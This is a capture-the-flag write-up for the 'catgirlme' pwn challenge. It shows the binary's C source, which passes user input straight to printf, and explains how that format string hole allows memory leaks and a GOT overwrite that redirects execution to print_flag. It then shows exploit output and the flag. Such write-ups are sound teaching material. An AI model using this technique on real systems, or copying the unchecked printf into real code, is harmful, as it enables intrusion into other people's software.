# [Pwn] catgirlme

## 💡 Challenge Description

> *Have you ever wanted to sound like a catgirl?*

## 🔒 ELF Properties

```
rydzze ~ ❯ file catgirlme
catgirlme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=031d4499e23f5e5cd09eaf70cebe38a7da5d4951, for GNU/Linux 3.2.0, with debug_info, not stripped

rydzze ~ ❯ checksec --file=catgirlme
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   45 Symbols        No    0               2               catgirlme
```

## ✨ Walkthrough

```c
void print_flag() {
    char buf[64];
    FILE *file = fopen("flag.txt", "r");

    if (file == NULL) {
      printf("Failed to open flag file!");
      exit(1);
    }

    fgets(buf, sizeof(buf), file);
    printf("%s", buf);
    fclose(file);
    exit(0);
}

void catgirl() {
    printf("Enter any phrase and I'll make it sound like you\'re a catgirl! \n");

    char input[100];

    while(1)
    {
      fflush(stdout);
      if (fgets(input, sizeof(input), stdin) == NULL) {
        printf("\nEOF detected. Exiting...\n");
        exit(0);
      }

      input[strcspn(input, "\n")] = '\0';

      printf("Here\'s what that would sound like if you were a catgirl:\n");
      printf(input);
      printf(" nya!\n");
      fflush(stdout);
    }
    fflush(stdout);
}
```

This binary is vulnerable to a **format string vulnerability** caused by passing user input directly to `printf()` without a proper format specifier. This allows control over how the program interprets memory, enabling two main exploitation techniques which are **information disclosure** and **arbitrary memory writes**. Using format specifiers like `%p`, `%x`, or `%s`, an attacker can leak memory addresses from the stack, which can be used to bypass protections such as **ASLR** by discovering function addresses or code offsets. More critically, arbitrary values can be written to chosen memory locations, such as **Global Offset Table (GOT)** entries or function pointers. With this capability, the program’s control flow can be redirected to any function within the binary, such as `print_flag()`, ultimately allowing the attacker to execute unintended code paths and obtain sensitive information like the contents of `flag.txt`.

## 🛠 Exploit

```
rydzze ~ ❯ python exploit.py remote
[+] Opening connection to 34.87.110.173 on port 5000: Done
[*] fflush@got: 0x404028
[*] print_flag: 0x401216

[+] Flag: sunctf25{b4d_k1tty!0931923}
[*] Closed connection to 34.87.110.173 port 5000
```

## 🏳️ Flag

`Flag: sunctf25{b4d_k1tty!0931923}`